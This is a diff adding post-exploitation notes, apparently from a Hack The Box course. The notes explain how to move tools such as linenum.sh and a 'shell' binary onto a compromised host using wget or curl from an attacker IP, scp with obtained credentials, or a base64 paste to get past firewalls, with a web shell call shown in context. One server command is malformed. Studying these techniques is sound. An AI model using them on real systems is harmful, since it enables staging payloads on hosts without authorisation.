@@ -114,3 +114,48 @@ ChrisVomRhein@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
+# file transfers
+
+## wget
+
+- create a http server hosting a file on the local machine, e.g. `cd /tmp && -m http.server 8000`.
+- download the file to the target machine, e.g. `wget http://10.10.14.1:8000/linenum.sh`, alternatively use curl, e.g. `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`
+
+## scp
+
+granted we have obtained ssh user credentials on the remote host, we can "push" files from out machine via scp as follows: `scp linenum.sh user@remotehost:/tmp/linenum.sh`
+
+## base64
+
+in some cases, we may not be able to transfer the file. for example, the remote host may have firewall protections that prevent us from downloading a file from our machine. in this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. for example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows: `base64 shell -w 0`
+
+Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file: `echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`
+
+## validating file transfers
+
+to validate the format of a file, we can run the file command on it:
+
+```
+> file shell
+
+shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
+```
+
+as we can see, when we run the file command on the shell file, it says that it is an elf binary, meaning that we successfully transferred it. to ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. on our machine, we can run md5sum on it:
+
+```
+> md5sum shell
+
+321de1d7e7c3735838890a72c9ae7d1d shell
+```
+
+now, we can go to the remote server and run the same command on the file we transferred:
+
+```
+> md5sum shell
+
+321de1d7e7c3735838890a72c9ae7d1d shell
+```
+
+as we can see, both files have the same md5 hash, meaning the file was transferred correctly. there are various other methods for transferring files. you can check out the file transfers module for a more detailed study on transferring files.
